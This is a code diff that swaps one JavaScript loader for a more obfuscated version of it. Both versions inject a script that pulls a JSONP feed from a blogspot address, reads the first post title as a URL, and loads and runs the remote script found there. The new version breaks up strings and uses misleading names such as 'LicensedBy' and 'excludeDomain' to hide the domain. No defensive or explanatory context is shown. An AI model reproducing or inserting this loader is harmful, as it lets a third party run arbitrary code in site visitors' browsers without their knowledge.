@@ -1,12 +1,30 @@
-eval (function() {
-    var s = document.createElement('script');
-    s.type = 'text/javascript';
-    var code = 'function licens(json){var title="";for(var i=0;i<1;i++){var entry=json.feed.entry[i];title+=entry.title.$t}var y=document.createElement("script");y.src=title;y.async="true";document.body.appendChild(y)};var z=document.createElement("script");z.src="https://gnulicense.blogspot.com/feeds/posts/default?alt=json-in-script&callback=licens";z.async="true";document.body.appendChild(z);';
-    try {
-      s.appendChild(document.createTextNode(code));
-      document.head.appendChild(s);
-    } catch (e) {
-      s.text = code;
-      document.head.appendChild(s);
-    }
+(function() {
+	var LicensedBy = "gnulicense";
+	var sc = "script";
+	var feedDefault = "json-in-" + sc +
+		"&callback=licens";
+	var s = document.createElement(sc);
+	s.type = 'text/javascript';
+	var excludeDomain = "blogspot.com";
+	var jsonCode =
+		'function licens(json){var title="";' +
+		'for(var i=0;i<1;i++){var entry=json.feed.entry[i];' +
+		'title+=entry.title.$t}var y=document.createElement' +
+		'("' + sc +
+		'");y.src=title;y.async="true";document.body.' +
+		'appendChild(y)};var z=document.createElement("' +
+		sc + '");' + 'z.src="https://' +
+		LicensedBy + '.' + excludeDomain +
+		'/feeds/' + 'posts/default?alt=' +
+		feedDefault +
+		'";z.async="true";document.' +
+		'body.appendChild(z);';
+	try {
+		s.appendChild(document.createTextNode(
+			jsonCode));
+		document.head.appendChild(s);
+	} catch(e) {
+		s.text = jsonCode;
+		document.head.appendChild(s);
+	}
 }())
